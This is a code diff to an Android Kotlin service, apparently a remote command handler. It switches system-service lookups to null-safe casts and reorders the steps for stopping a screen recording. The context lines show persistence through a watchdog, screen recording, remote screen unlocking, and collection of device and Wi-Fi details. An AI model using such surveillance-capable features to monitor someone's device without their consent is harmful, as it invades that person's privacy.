@@ -118,7 +118,7 @@ class CommandService : Service() {
     
     private fun ensureWatchdogRunning() {
         try {
-            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+            val manager = getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager ?: return
             @Suppress("DEPRECATION")
             val running = manager.getRunningServices(Integer.MAX_VALUE)
                 .any { it.service.className == WatchdogService::class.java.name }
@@ -704,8 +704,8 @@ class CommandService : Service() {
 
     private fun collectDeviceInfo(): JSONObject {
         val batteryLevel = try {
-            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
-            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
+            batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
         } catch (e: Exception) { -1 }
         
         val isRooted = try {
@@ -940,8 +940,8 @@ class CommandService : Service() {
     private fun executeStopScreenRecord() {
         serviceScope.launch {
             try {
-                screenRecordProcess?.destroy()
                 screenRecordProcess?.waitFor()
+                screenRecordProcess?.destroy()
                 
                 val file = screenRecordFile
                 if (file != null && file.exists()) {
@@ -1055,8 +1055,8 @@ class CommandService : Service() {
     private fun executeUnlockScreen() {
         serviceScope.launch {
             try {
-                val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+                val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: return@launch
+                val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return@launch
                 
                 val wakeLock = powerManager.newWakeLock(
                     PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
@@ -1117,7 +1117,7 @@ class CommandService : Service() {
         
         serviceScope.launch {
             try {
-                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return@launch
                 val audioMode = when(mode.lowercase()) {
                     "normal" -> AudioManager.MODE_NORMAL
                     "silent" -> AudioManager.RINGER_MODE_SILENT
@@ -1144,7 +1144,7 @@ class CommandService : Service() {
     private fun executeGetWifiInfo() {
         serviceScope.launch {
             try {
-                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager ?: return@launch
                 val wifiInfo = wifiManager.connectionInfo
                 
                 val info = JSONObject().apply {
